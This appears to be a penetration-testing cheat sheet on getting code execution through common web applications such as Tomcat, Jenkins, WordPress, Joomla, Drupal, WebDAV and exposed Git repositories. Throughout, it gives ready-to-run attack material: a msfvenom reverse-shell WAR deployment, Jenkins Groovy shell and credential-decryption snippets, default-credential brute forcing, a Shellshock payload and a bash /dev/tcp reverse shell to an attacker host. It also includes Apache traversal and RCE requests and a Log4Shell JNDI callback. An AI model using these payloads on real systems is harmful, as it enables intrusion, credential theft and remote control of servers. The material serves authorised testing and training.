# Known web applications: from access to code execution

Version and role first ([fingerprinting](fingerprinting.md)); an admin login or readable config is the precondition for most rows. Use your usual reverse shell file ([shells](../foothold/shells.md)) as the payload; test the trigger path with a harmless marker first.

| Found | Needs | Section |
| --- | --- | --- |
| `/manager/html` or `/manager/text` | Accepted manager credentials | [Tomcat](#tomcat) |
| `/script`, `/credentials` | Script console reachable | [Jenkins](#jenkins) |
| `/wp-login.php`, `/wp-content/` | Admin login, or DB/FTP creds | [WordPress](#wordpress) |
| `/administrator/` (Joomla), `/user/login` (Drupal) | Admin login | [Joomla and Drupal](#joomla-and-drupal) |
| `.git/` readable | Directory served | [Exposed Git](#exposed-git) |
| WebDAV (`OPTIONS` shows `PUT`/`PROPFIND`) | Write method allowed | [WebDAV](#webdav) |
| `/cgi-bin/` script | Bash-backed CGI | [Shellshock](#shellshock) |
| Version banner | Exact match | [Known CVE patterns](#known-cve-patterns) |

## Default credentials
- Product docs and installer pages name defaults; try only those against the one login, not a list. Record lockout behaviour first.
- Config files give better odds: `tomcat-users.xml`, `wp-config.php`, `configuration.php`, `credentials.xml` via [LFI](lfi.md) or an exposed repo.

## Tomcat
```bash
curl -s -o /dev/null -w '%{http_code}\n' http://<IP>:8080/manager/html
curl -s -u '<USER>:<PW>' http://<IP>:8080/manager/text/list
```
- `401` = realm exists, creds needed. `403` with a "restricted to localhost" page = `RemoteAddrValve`; try an SSRF/pivot to 127.0.0.1.
- Small default set: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`. Wider: `hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt <IP> -s 8080 http-get /manager/html`. Check lockout/rate first.
- Config on disk: `$CATALINA_BASE/conf/tomcat-users.xml`.

Deploy a WAR (role `manager-script` for the text interface; `manager-gui` for the web UI):
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=443 -f war -o shell.war
nc -lvnp 443
curl -u '<USER>:<PW>' --upload-file shell.war 'http://<IP>:8080/manager/text/deploy?path=/shell'
curl http://<IP>:8080/shell/
```
Remove it afterwards:
```bash
curl -u '<USER>:<PW>' 'http://<IP>:8080/manager/text/undeploy?path=/shell'
```
- GUI route: Manager → "WAR file to deploy" → upload → click the new path.
- Linux service usually runs as `tomcat`; Windows service installs often run as SYSTEM or a service account: `whoami /priv` → [potato](../windows/potato.md).
- AJP 8009 open on an old build: [Ghostcat](../enum/exposed-services.md#ajp-8009-tomcat).

## Jenkins
```bash
curl -s -o /dev/null -w '%{http_code}\n' http://<IP>:8080/script
curl -s http://<IP>:8080/ | grep -i 'x-jenkins\|version'
```
- `/script` needs admin (or anonymous misconfig). `/credentials/`, `/asynchPeople/`, and job configs leak usernames/secrets.

Script console (Groovy). Linux:
```groovy
println "id".execute().text
println "bash -c {echo,<BASE64-OF-REVERSE-SHELL>}|{base64,-d}|{bash,-i}".execute().text
```
Windows:
```groovy
println "cmd.exe /c whoami".execute().text
println "powershell -nop -ep bypass -enc <UTF16LE-BASE64>".execute().text
```
- `.execute()` splits on spaces and has no shell: pipes only work inside the `bash -c` token above.
- Stored credentials in `credentials.xml` are `{AQAAAB...}` blobs; decrypt in the script console:
```groovy
println hudson.util.Secret.decrypt("{<BLOB>}")
```
- Offline: `secrets/master.key` + `secrets/hudson.util.Secret` + `credentials.xml` from the Jenkins home.
- No script console: Manage Jenkins → a job with a build step "Execute shell/Windows batch command", then Build Now.

## WordPress
```bash
wpscan --url http://<IP> --enumerate u,vp,vt --api-token <TOKEN>
```
- Hashes from `wp_users` (`$P$…`): `hashcat -m 400`. `wp-config.php` DB creds are often reused for admin.
- Admin → Appearance → Theme File Editor: add your reverse shell to an inactive theme's `404.php`, then request `/wp-content/themes/<THEME>/404.php`. Missing editor = `DISALLOW_FILE_EDIT`.
- Admin → Plugins → Add New → Upload: zip containing the shell file, activate or just request `/wp-content/plugins/<NAME>/<FILE>.php`.
```bash
zip plugin.zip rev.php
```
- Vulnerable plugin (unauthenticated): `searchsploit wordpress plugin <NAME>` → [public exploits](../foothold/public-exploits.md). Confirm the installed plugin version in `readme.txt` first.
- Restore the theme file you edited.

## Joomla and Drupal
- Joomla: `configuration.php` (DB creds, `$secret`); admin → Extensions → Templates → edit `error.php`/`index.php` of a template, then request any page that renders it. Check version at `/administrator/manifests/files/joomla.xml`.
- Drupal 7: Modules → enable **PHP filter**, create content with text format "PHP code". Drupal 8+: no PHP filter; check version for Drupalgeddon-class PoCs (`searchsploit drupal`). Version: `CHANGELOG.txt`, `/core/`.
- Hash modes: Joomla bcrypt `3200`, Drupal 7 `$S$` `7900`.

## Exposed Git
```bash
curl -s http://<IP>/.git/HEAD
pip install git-dumper
git-dumper http://<IP>/.git/ ./repo
```
```bash
cd repo
git log --all --stat
git log -p -S 'password'
git branch -a
git stash list
git show <COMMIT>
git checkout .          # restore working tree after the dump
grep -rniE 'pass|secret|key|token' .
```
- `HEAD` content like `ref: refs/heads/main` confirms a repo. A `403` on `/.git/` can still serve `/.git/HEAD`.
- Old commits and other branches hold removed credentials; the working tree alone often does not.

## WebDAV
```bash
curl -s -X OPTIONS -i http://<IP>/ | grep -i 'allow\|dav'
davtest -url http://<IP>/
cadaver http://<IP>/
```
```text
put shell.aspx
```
- Blocked extension: upload as `.txt`, then rename: `curl -X MOVE -H 'Destination: http://<IP>/shell.aspx' http://<IP>/shell.txt`.
- IIS: `.aspx`/`.asp`; Apache: `.php`. Authenticated: `davtest -auth <USER>:<PW>`, `cadaver` prompts.

## Shellshock
Bash-backed CGI (`.sh`, `.cgi`, `.pl` calling bash):
```bash
curl -s -H "User-Agent: () { :; }; echo; echo; /usr/bin/id" http://<IP>/cgi-bin/<SCRIPT>
nmap -Pn -p80 --script http-shellshock --script-args uri=/cgi-bin/<SCRIPT> <IP>
```
- Reverse shell: replace `/usr/bin/id` with `/bin/bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'`.

## Known CVE patterns
Match the exact version and config first.

| Clue | Check |
| --- | --- |
| Apache **2.4.49** (CVE-2021-41773) | `curl --path-as-is 'http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'` |
| Apache **2.4.50** (CVE-2021-42013) | `curl --path-as-is 'http://<IP>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'` |
| Apache 2.4.49/50 + `mod_cgi` enabled | `curl --path-as-is -d 'echo;id' 'http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'` |
| Java app logging your input | `${jndi:ldap://<KALI>:1389/a}` in headers/fields; DNS/TCP hit = Log4Shell candidate → public PoC |
| Tomcat AJP 8009 | [Ghostcat](../enum/exposed-services.md#ajp-8009-tomcat) |
| Anything else | `searchsploit <product> <version>` → [public exploits](../foothold/public-exploits.md) |

- Traversal works only where `Require all denied` is not set on the target path; RCE also needs `mod_cgi`. A `404` on the traversal URL ≠ patched: try the other encoding.
- Log4Shell callback: listen with `nc -lvnp 1389`. A TCP connection proves the lookup; exploitation needs a JNDI server and a vulnerable Java version.
